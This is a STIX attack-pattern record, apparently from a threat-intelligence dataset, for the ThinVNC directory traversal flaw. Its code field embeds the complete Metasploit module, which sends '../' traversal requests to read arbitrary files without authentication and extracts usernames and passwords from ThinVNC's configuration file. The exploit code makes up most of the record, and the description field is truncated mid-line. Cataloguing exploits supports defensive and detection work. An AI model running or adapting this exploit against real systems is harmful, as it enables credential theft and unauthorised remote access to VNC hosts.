{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db3e0756-236d-4b37-8359-189bfade0feb",
    "created": "2024-08-14T16:29:14.659517Z",
    "modified": "2024-08-14T16:29:14.659521Z",
    "name": "ThinVNC Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability in ThinVNC versions 1.0b1 and prior which allows unauthenticated users to retrieve arbitrary files, including the ThinVNC configuration file.  This module has been tested successfully on ThinVNC versions 1.0b1 and \"ThinVNC_Latest\" (2018-12-07).  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/thinvnc_traversal.rb",
            "external_id": "thinvnc_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bewest/thinvnc/issues/5"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/shashankmangal2/Exploits/blob/master/ThinVNC-RemoteAccess/POC.py"
        },
        {
            "source_name": "reference",
            "url": "https://redteamzone.com/ThinVNC/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'ThinVNC Directory Traversal',\n      'Description' => %q{\n        This module exploits a directory traversal vulnerability in ThinVNC\n        versions 1.0b1 and prior which allows unauthenticated users to retrieve\n        arbitrary files, including the ThinVNC configuration file.\n\n        This module has been tested successfully on ThinVNC versions 1.0b1\n        and \"ThinVNC_Latest\" (2018-12-07).\n      },\n      'References'  =>\n        [\n          ['CVE', '2019-17662'],\n          ['URL', 'https://github.com/bewest/thinvnc/issues/5'],\n          ['URL', 'https://github.com/shashankmangal2/Exploits/blob/master/ThinVNC-RemoteAccess/POC.py'],\n          ['URL', 'https://redteamzone.com/ThinVNC/']\n        ],\n      'Author'      =>\n        [\n          'jinxbox', # Discovery and PoC\n          'WarMarX', # PoC\n          'bcoles'   # metasploit\n        ],\n      'DefaultOptions' => { 'RPORT' => 8080 },\n      'DisclosureDate' => '2019-10-16',\n      'License' => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('FILEPATH', [true, 'The path to the file to read', 'ThinVnc.ini']),\n        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 2])\n      ])\n  end\n\n  def run_host(ip)\n    depth = datastore['DEPTH']\n    filepath = datastore['FILEPATH']\n\n    res = retrieve_file(depth, filepath)\n\n    return if res.blank?\n\n    filename = File.basename(filepath)\n\n    path = store_loot(\n      'thinvnc.traversal',\n      'text/plain',\n      ip,\n      res.to_s,\n      filename\n    )\n\n    print_good(\"File #{filename} saved in: #{path}\")\n\n    # Report vuln and store creds if we successfully retrieved the config file\n    if filename.downcase == 'thinvnc.ini' && res.to_s.start_with?('[Authentication]')\n      report_service(\n        :host => ip,\n        :port => rport,\n        :sname => (ssl ? 'https' : 'http'),\n        :info => 'ThinVNC'\n      )\n\n      report_vuln(\n        :host  => ip,\n        :port  => rport,\n        :proto => 'tcp',\n        :sname => (ssl ? 'https' : 'http'),\n        :name  => 'ThinVNC Directory Traversal',\n        :info  => 'ThinVNC Directory Traversal',\n        :refs  => self.references\n      )\n\n      username = res.scan(/^User=(.+)$/).flatten.first.to_s.strip\n      password = res.scan(/^Password=(.+)$/).flatten.first.to_s.strip\n\n      if username && password\n        print_good \"Found credentials: #{username}:#{password}\"\n        store_valid_credential(user: username, private: password)\n      end\n    end\n  end\n\n  def retrieve_file(depth, filepath)\n    traversal = Rex::Text.rand_text_alphanumeric(3..5)\n    traversal << '/'\n    traversal << '../' * depth\n    traversal << filepath\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, traversal)\n    })\n\n    unless res\n      vprint_error 'No reply'\n      return\n    end\n\n    if res.code == 404\n      vprint_error 'File not found'\n      return\n    end\n\n    if res.code != 200\n      vprint_error 'Unexpected reply'\n      return\n    end\n\n    res.body.to_s\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-10-16"
}